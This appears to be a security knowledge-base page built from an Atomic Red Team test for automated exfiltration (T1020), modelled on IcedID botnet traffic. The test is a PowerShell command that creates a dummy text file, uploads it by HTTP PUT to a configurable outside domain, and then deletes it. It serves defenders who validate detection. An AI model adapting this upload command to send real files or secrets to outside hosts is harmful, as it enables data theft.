---
atomic_guid: "9c780d3d-3a14-4278-8ee5-faaeb2ccfbe0"
title: "IcedID Botnet HTTP PUT"
framework: "atomic"
generated: "true"
attack_technique_id: "T1020"
attack_technique_name: "Automated Exfiltration"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1020/T1020.yaml"
build_date: "2026-04-27 19:12:25"
executor: "powershell"
aliases:
  - "9c780d3d-3a14-4278-8ee5-faaeb2ccfbe0"
  - "IcedID Botnet HTTP PUT"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Creates a text file
Tries to upload to a server via HTTP PUT method with ContentType Header
Deletes a created file

## ATT&CK Mapping

- [[kb/attack/techniques/T1020-automated_exfiltration|T1020: Automated Exfiltration]]

## Input Arguments

### domain

- description: Destination Domain
- type: url
- default: https://google.com

### file

- description: Exfiltration File
- type: string
- default: C:\temp\T1020_exfilFile.txt

## Executor

- name: powershell

### Command

```powershell
$fileName = "#{file}"
$url = "#{domain}"
$file = New-Item -Force $fileName -Value "This is ART IcedID Botnet Exfil Test"
$contentType = "application/octet-stream"
try {Invoke-WebRequest -Uri $url -Method Put -ContentType $contentType -InFile $fileName} catch{}
```

### Cleanup

```powershell
$fileName = "#{file}"
Remove-Item -Path $fileName -ErrorAction Ignore
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1020/T1020.yaml)
